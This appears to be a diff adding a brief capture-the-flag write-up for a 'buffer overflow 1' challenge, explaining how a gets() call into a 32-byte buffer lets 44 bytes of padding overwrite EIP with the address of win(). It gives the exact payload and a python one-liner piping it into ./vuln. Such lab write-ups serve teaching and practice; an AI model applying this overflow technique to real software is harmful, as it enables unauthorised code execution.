@@ -1,0 +1,19 @@
+Writeup: buffer overflow 1
+
+in vuln.c the buffer is size 32
+
+inside the function vuln() there is a call to gets() which reads to the buffer
+after entering 44 characters the next 4 bytes will overwrite the eip
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[4 bytes]
+
+want to get to 080485cb where function win() is since it will print flag
+
+address of win in little endian format
+\xcb\x85\x04\x08
+
+input string to program
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcb\x85\x04\x08
+
+python -c 'print("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcb\x85\x04\x08")' | ./vuln
+
